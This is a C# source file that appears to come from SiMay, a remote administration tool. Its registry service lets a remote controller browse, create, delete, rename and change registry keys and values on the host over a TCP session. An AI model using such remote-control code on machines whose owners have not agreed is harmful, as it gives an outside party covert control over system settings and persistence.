using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.Platform.Windows;
using SiMay.ServiceCore.Attributes;
using SiMay.Sockets.Tcp.Session;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SiMay.ServiceCore
{
    [ServiceName("远程注册表")]
    [ServiceKey(AppJobConstant.REMOTE_REGEDIT)]
    public class RegistryEditorService : ApplicationRemoteService
    {
        public override void SessionInited(TcpSocketSaeaSession session)
        {

        }

        public override void SessionClosed()
        {

        }

        [PacketHandler(MessageHead.S_NREG_LOAD_REGKEYS)]
        public void HandleGetRegistryKey(TcpSocketSaeaSession session)
        {
            DoLoadRegistryKeyPack packet = GetMessageEntity<DoLoadRegistryKeyPack>(session);
            GetRegistryKeysResponsePack responsePacket = new GetRegistryKeysResponsePack();
            try
            {
                RegistrySeeker seeker = new RegistrySeeker();
                seeker.BeginSeeking(packet.RootKeyName);

                responsePacket.Matches = seeker.Matches;
                responsePacket.IsError = false;
            }
            catch (Exception e)
            {
                responsePacket.IsError = true;
                responsePacket.ErrorMsg = e.Message;
            }
            responsePacket.RootKey = packet.RootKeyName;
            SendTo(CurrentSession, MessageHead.C_NREG_LOAD_REGKEYS, responsePacket);
        }

        #region Registry Key Edit

        [PacketHandler(MessageHead.S_NREG_CREATE_KEY)]
        public void HandleCreateRegistryKey(TcpSocketSaeaSession session)
        {
            var packet = GetMessageEntity<DoCreateRegistryKeyPack>(session);
            GetCreateRegistryKeyResponsePack responsePacket = new GetCreateRegistryKeyResponsePack();
            string errorMsg;
            string newKeyName = "";

            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryKey(packet.ParentPath, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }

            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Match = new RegSeekerMatch
            {
                Key = newKeyName,
                Data = RegistryKeyHelper.GetDefaultValues(),
                HasSubKeys = false
            };
            responsePacket.ParentPath = packet.ParentPath;

            SendTo(CurrentSession, MessageHead.C_NREG_CREATE_KEY_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        [PacketHandler(MessageHead.S_NREG_DELETE_KEY)]
        public void HandleDeleteRegistryKey(TcpSocketSaeaSession session)
        {
            DoDeleteRegistryKeyPack packet = GetMessageEntity<DoDeleteRegistryKeyPack>(session);
            GetDeleteRegistryKeyResponsePack responsePacket = new GetDeleteRegistryKeyResponsePack();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.ParentPath;
            responsePacket.KeyName = packet.KeyName;

            SendTo(CurrentSession, MessageHead.C_NREG_DELETE_KEY_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        [PacketHandler(MessageHead.S_NREG_RENAME_KEY)]
        public void HandleRenameRegistryKey(TcpSocketSaeaSession session)
        {
            DoRenameRegistryKeyPack packet = GetMessageEntity<DoRenameRegistryKeyPack>(session);
            GetRenameRegistryKeyResponsePack responsePacket = new GetRenameRegistryKeyResponsePack();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.ParentPath;
            responsePacket.OldKeyName = packet.OldKeyName;
            responsePacket.NewKeyName = packet.NewKeyName;

            SendTo(CurrentSession, MessageHead.C_NREG_RENAME_KEY_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        #endregion

        #region RegistryValue Edit

        [PacketHandler(MessageHead.S_NREG_CREATE_VALUE)]
        public void HandleCreateRegistryValue(TcpSocketSaeaSession session)
        {
            DoCreateRegistryValuePack packet = GetMessageEntity<DoCreateRegistryValuePack>(session);
            GetCreateRegistryValueResponsePack responsePacket = new GetCreateRegistryValueResponsePack();
            string errorMsg;
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Value = RegistryKeyHelper.CreateRegValueData(newKeyName, packet.Kind, packet.Kind.GetDefault());
            responsePacket.KeyPath = packet.KeyPath;

            SendTo(CurrentSession, MessageHead.C_NREG_CREATE_VALUE_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        [PacketHandler(MessageHead.S_NREG_DELETE_VALUE)]
        public void HandleDeleteRegistryValue(TcpSocketSaeaSession session)
        {
            DoDeleteRegistryValuePack packet = GetMessageEntity<DoDeleteRegistryValuePack>(session);
            GetDeleteRegistryValueResponsePack responsePacket = new GetDeleteRegistryValueResponsePack();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ValueName = packet.ValueName;
            responsePacket.KeyPath = packet.KeyPath;

            SendTo(CurrentSession, MessageHead.C_NREG_DELETE_VALUE_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        [PacketHandler(MessageHead.S_NREG_RENAME_VALUE)]
        public void HandleRenameRegistryValue(TcpSocketSaeaSession session)
        {
            DoRenameRegistryValuePack packet = GetMessageEntity<DoRenameRegistryValuePack>(session);
            GetRenameRegistryValueResponsePack responsePacket = new GetRenameRegistryValueResponsePack();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.KeyPath;
            responsePacket.OldValueName = packet.OldValueName;
            responsePacket.NewValueName = packet.NewValueName;

            SendTo(CurrentSession, MessageHead.C_NREG_RENAME_VALUE_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        [PacketHandler(MessageHead.S_NREG_CHANGE_VALUE)]
        public void HandleChangeRegistryValue(TcpSocketSaeaSession session)
        {
            DoChangeRegistryValuePack packet = GetMessageEntity<DoChangeRegistryValuePack>(session);
            GetChangeRegistryValueResponsePack responsePacket = new GetChangeRegistryValueResponsePack();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.KeyPath;
            responsePacket.Value = packet.Value;

            SendTo(CurrentSession, MessageHead.C_NREG_CHANGE_VALUE_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        #endregion
    }
}
